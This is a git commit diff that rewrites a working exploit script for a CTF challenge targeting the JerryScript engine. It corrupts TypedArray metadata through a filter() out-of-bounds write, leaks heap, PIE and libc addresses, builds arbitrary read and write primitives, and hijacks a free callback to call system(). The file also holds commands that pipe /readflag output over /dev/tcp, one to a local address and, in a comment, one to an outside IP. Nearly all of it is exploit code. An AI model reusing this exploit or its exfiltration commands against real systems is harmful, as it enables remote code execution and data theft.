10010c617fd85a2c7ca78667341c2fb1878c8d66
jt00000 <jtforjob@gmail.com>
2023-01-05 13:39:33 +0900

    asisf2022 jry

--- asisf2022/jry/exp.js
+++ asisf2022/jry/exp.js
@@ -1,18 +1,3 @@
-////////
-///bin/id; whoami; 
-var buf = new ArrayBuffer(8);
-var f64v = new Float64Array(buf);
-var i64v = new BigInt64Array(buf);
-
-
-BigInt.prototype.i2f = function() {
-	i64v[0] = this;
-	return f64v[0];
-}
-Number.prototype.f2i = function() {
-	f64v[0] = this;
-	return i64v[0];
-}
 Number.prototype.hex = function() {
 	return "0x" + this.toString(16);
 }
@@ -20,135 +5,152 @@ BigInt.prototype.hex = function() {
 	return "0x" + this.toString(16);
 }
 
-/*
-var a = new Uint32Array(0x100);
-var y = new Float64Array(0x100);
-y[0] = 1.1; // mark
+// Typedarray with external pointer in jerryscript
+// There is flag in header of heap chunk ( at chunk + 0xb ) and we can switch its buffer to external pointer.
+//   ( You can't call this from js normally. )
+// We can overwrite this flag to 1 and unlock external pointer with callback when free it.
+//
 
-a = 0;
+// Memory Layout
+//
+// [ jerry_global_heap ]
+// -------
+// ...
+// -------
+// array_0 <-- filtered chunk ( with oob memcpy ) will place here
+// -------
+// array_1 <-- ovrwrite length of this array 
+// -------
+// array_2 <-- AAR/W array
+// -------
+// ...
+// for_leaks <-- drop heap leak after gc()
+// ...
+// -------
+//
+
+var array_0 = new Uint8Array(0x300);
+var array_1 = new Uint32Array(0x100);
+var array_2 = new Uint32Array(0x100);
+var for_leaks = [];
+for (let i = 0; i < 0x2000; i++) for_leaks.push({"A": 1});
+
+// place os command
+// bash -c "/readflag > /dev/tcp/18.218.8.16/44444
+//var sc = [1752392034, 543370528, 1701981986, 1818649697, 1042311009, 1701064480, 1668558710, 942747504, 942748206, 825112622, 875835190, 573846580];
+
+// /bin/whoami
+var sc = [1852400175, 1869117231, 6909281];
+
+// create oob payload
+var leng = 0xc0;
+for (let i = 0; i < leng; i++) array_2[i] = 0xfff;
+array_2[leng] = 0x21;
+array_2[leng+1] = 0;
+array_2[leng+2] = 0x117;
+array_2[leng+3] = 0x313370 >> 2;
+
+array_2.constructor = Uint8Array;
+array_0 = 0; // this will wipe array_0 reference and after gc(), we can reclaim this area again.
+for_leaks = 0;
 gc();
-var c = new Uint32Array(0x100);
-c[0] = 0x11223344; //mark
 
-print(y);
-*/
+// trigger bug to overwrite
+array_2.filter(x => true);
+print("corrupted length:", array_1.length.hex());
 
-var area0 = new Uint32Array(0x100);
-var area1 = new Float64Array(0x100);
-var area2 = new Float64Array(0x100);
-
-
-var x = [];
-for (let i = 0; i < 0x80; i++) {
-	x.push({"A":1});
-}
-
-var range = 0x80;
-for (let i=0;i < range;i++) {
-	area2[i] = 1.1;
-}
-/*
-area0 = 0;
-var areax = new Uint32Array(0x100);
-areax[0] = 0xffeeffee;
-x = 0;
-gc();
-while(1){}
-*/
-//area2[range] = (0x0077000001610021n).i2f();
-area2[range] = (0x0000000000000021n).i2f();
-area2[range+1] = (0x00001f0000000117n).i2f();
-
-area2.constructor = Uint32Array;
-area0 = 0; // wipe area0
-x = 0; // wipe x
-gc();
-//var area2 = new Float64Array(0x80);
-//area2[0] = 3.3;
-var area0_overflow = area2.filter(x => x);
-print(area1.length.hex());
-/*
-for (let i = 0x200; i < area1.length; i++){
-	print(i);
-	if (area1[i] != 0 && area1[i] != undefined) {
-		print(area1[i]);
-		print(i, area1[i].f2i().hex());
+// get heap leak
+var leak_lo = 0;
+var leak_hi = 0;
+for (let i = 1; i < 0x1000; i++ ){
+	if (array_1[i] < 0x6000 && array_1[i] > 0x5000 && array_1[i-1] != 0) {
+		leak_lo = array_1[i-1];
+		leak_hi = array_1[i];
+		break;
 	}
 }
-*/
+var leak = (BigInt(leak_hi) << 32n) + BigInt(leak_lo);
 
-var find_heap_leak;
-for (let i = 0x200; i < 0x300; i++){
-	if (area1[i] != 0 && area1[i] != undefined) {
-		let v = area1[i].f2i();
-		if (v > 0x500000000000n && v < 0x600000000000n) {
-			find_heap_leak = i;
-			break;
-		}
-	}
+// now we have valid address. turn the flag to 1 and get AAR primitive. 
+array_1[0x102] = 0x10117;
+function aar32(addr) {
+	array_1[0x104] = Number(addr & 0xffffffffn);
+	array_1[0x105] = Number(addr >> 32n);
+	return array_2[0];
 }
-var leak = area1[find_heap_leak].f2i();
-//var leak = area1[0x1020/8].f2i();
-print("leak:", leak.hex());
-
-//print(area1[0x101].f2i().hex());
-area1[0x101] = (0x0000010000010117n).i2f();
-
 function aar(addr) {
-	area1[0x102] = (addr).i2f();
-	return area2[0].f2i();
+	return BigInt(aar32(addr)) + (BigInt(aar32(addr+4n)) << 32n);
 }
-function aaw(addr, value) {
-	area1[0x102] = (addr).i2f();
-	aar(addr);
-	area2[0] = value.i2f();
+function aaw32(addr, value) {
+	array_1[0x104] = Number(addr & 0xffffffffn);
+	array_1[0x105] = Number(addr >> 32n);
+	array_2[0] = value.i2f();
 }
 
-var find = -1;
-var offset = 0x2b80n;
-for (let i = 0; i < 0x200; i+=8){
-	let value = aar(leak - offset + BigInt(i));
-	if (value < 0x2000n && value != 0) {
-		let check = aar(leak - offset + BigInt(i)+8n);
-		if ((check & 0xffffn) == 0x0070n) {
-			find = i;
+// get heap, pie, libc offset 
+var target = leak - 0x3000n;
+var heap_base = 0n;
+for (let i = 0; i < 0x1000; i++ ){
+	if (aar32(target + BigInt(i) * 8n) < 0x1000) {
+		if ((aar32(target + BigInt(i) * 8n + 8n) & 0xffff) == 0x70) {
+			heap_base = target + BigInt(i) * 8n;
 			break;
 		}
 	}
 }
-var jerry_global_heap = leak - offset + BigInt(find);
-print("heap base:", jerry_global_heap.hex());
-var pie_leak = aar(jerry_global_heap+0x188n);
-//var pie = pie_leak - 0x4dff5n;
-var pie = pie_leak - 0x4f2e8n;
-print("pie_leak:", pie_leak.hex());
-print("pie:", pie.hex());
-
-//var got_free = pie + 0x68eb8n;
-var got_free = pie + 0x6eeb8n;
-
-var libc_free = aar(got_free);
-print("libc_free:", libc_free.hex());
-var libc_base = libc_free - 0xa5460n;
-print("libc_base:", libc_base.hex());
-var libc_system = libc_base + 0x50d60n;
-
-var cmd_addr = jerry_global_heap + 0x1a49n;
-var cmd = "bash -c '/readflag > /dev/tcp/127.0.0.1/44444;'";
-cmd = cmd.padEnd(0x40, '\0');
-//print(area1[0]);
-area1[0x102] = (cmd_addr).i2f();
-area1[0x103] = (libc_system).i2f();
-area1[0x10] = (0xdeadbeefn).i2f();
-for (let i = 0; i < 0x40; i+=8) {
-	var value = 0n;
-	for (let j = 0; j < 8; j++) {
-		value |= BigInt(cmd.charCodeAt(i+j)) << BigInt((j*8));
-	}
-	area1[0x11+i/8] = value.i2f();
+if ( heap_base == 0n ) {
+	print("heap_base not found. check offset.");
+	while(1) {}
 }
+print("heap_base:", heap_base.hex());
 
-area2 = 0;
+var ptr_jerryx_handler_assert = heap_base + 0x148n;
+var jerryx_handler_assert = aar(ptr_jerryx_handler_assert);
+var pie = jerryx_handler_assert - 0x4eb93n;
+var ptr_got_free = pie + 0x68eb8n;
+var got_free = aar(ptr_got_free);
+var libc_base = got_free - 0xa5460n;
+var system = libc_base + 0x50d60n;
+print("libc_base:", libc_base.hex());
+
+// get addr of array_1 to locate our command addr
+// mark for search
+array_1[0] = 0x11221122;
+array_1[1] = 0x33443344;
+
+// you can use aaw here, but this way is more stable.
+for (let i = 0; i < sc.length; i++ ){
+	array_1[i+2] = sc[i];
+}
+var addr_array_1 = 0;
+for (let i = 0; i < 0x1000; i++ ){
+	if (aar32(heap_base + BigInt(i) * 8n) == 0x11221122) {
+		if (aar32(heap_base + BigInt(i) * 8n + 4n) == 0x33443344) {
+			addr_array_1 = heap_base + BigInt(i) * 8n;
+			break;
+		}
+	}
+}
+if ( addr_array_1 == 0n ) {
+	print("array_1 not found. check offset.");
+	while(1) {}
+}
+print("array_1:", addr_array_1.hex());
+
+// change array_2 external pointer to our command
+array_1[0x104] = Number((addr_array_1 + 8n) & 0xffffffffn);
+array_1[0x105] = Number((addr_array_1 + 8n) >> 32n);
+
+// change array_2 free_cb to system
+array_1[0x106] = Number(system & 0xffffffffn);
+array_1[0x107] = Number(system >> 32n);
+
+// wipe array_2 reference
+array_2 = 0;
+
+// trigger array_2 free_cb
 gc();
-var xx= new Float64Array(0x80);
+
+// we need this to prevent any other destructor call
 while(1) {}
+
